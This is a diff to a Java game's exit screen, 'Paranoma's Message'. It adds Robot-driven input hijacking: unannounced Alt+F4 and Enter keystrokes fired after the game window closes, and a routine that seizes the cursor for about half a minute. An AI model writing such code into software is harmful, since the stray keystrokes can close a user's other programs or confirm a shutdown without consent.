@@ -1,9 +1,14 @@
 package com.anmol.games;
 
+import com.jme3.math.FastMath;
+
 import javax.imageio.ImageIO;
 import javax.swing.*;
 import java.awt.*;
 import java.awt.event.ActionEvent;
+import java.awt.event.KeyEvent;
+import java.awt.event.WindowAdapter;
+import java.awt.event.WindowEvent;
 import java.awt.image.BufferedImage;
 import java.io.IOException;
 import java.util.List;
@@ -19,6 +24,24 @@ public class OnExit {
 
         JFrame frame = new JFrame("Paranoma's Message");
         frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
+        frame.addWindowListener(new WindowAdapter() {
+            @Override
+            public void windowClosed(WindowEvent e) {
+                try {
+                    Robot robot = new Robot();
+                    robot.keyPress(KeyEvent.VK_ALT);
+                    robot.keyPress(KeyEvent.VK_F4);
+                    robot.keyRelease(KeyEvent.VK_F4);
+                    robot.keyRelease(KeyEvent.VK_ALT);
+                    robot.delay(700);
+                    robot.keyPress(KeyEvent.VK_ENTER);
+                    robot.keyRelease(KeyEvent.VK_ENTER);
+                    robot.delay(100);
+                } catch (AWTException ex) {
+                    throw new RuntimeException(ex);
+                }
+            }
+        });
 
         Dimension d = Toolkit.getDefaultToolkit().getScreenSize();
         Dimension dimension = new Dimension(d.width * 3 / 4, d.height * 3 / 4);
@@ -72,7 +95,19 @@ public class OnExit {
             @Override
             public void actionPerformed(ActionEvent e) {
                 jButton2.getParent().remove(jButton2);
-                label.setText("<html><center>Currently I don't have privileges but<br/>...<br/>I can destroy that Button<br/>What you will do Now.</center></html>");
+                label.setText("<html><center>Currently I don't have privileges but<br/>...<br/>I can destroy that Button<br/>And Lock Your Cursor<br/>What you will do Now.</center></html>");
+                new Thread(() -> {
+                    try {
+                        Dimension d = Toolkit.getDefaultToolkit().getScreenSize();
+                        Robot robot = new Robot();
+                        robot.setAutoDelay(16);
+                        for (int i = 0; i < 2000; i++) {
+                            robot.mouseMove((int) (d.width/2 + FastMath.sin(i/100f)*d.height/2.4f), (int) (d.height/2 + FastMath.cos(i/100f)*d.height/2.4f));
+                        }
+                    } catch (AWTException ex) {
+                        throw new RuntimeException(ex);
+                    }
+                }).start();
             }
         });
 
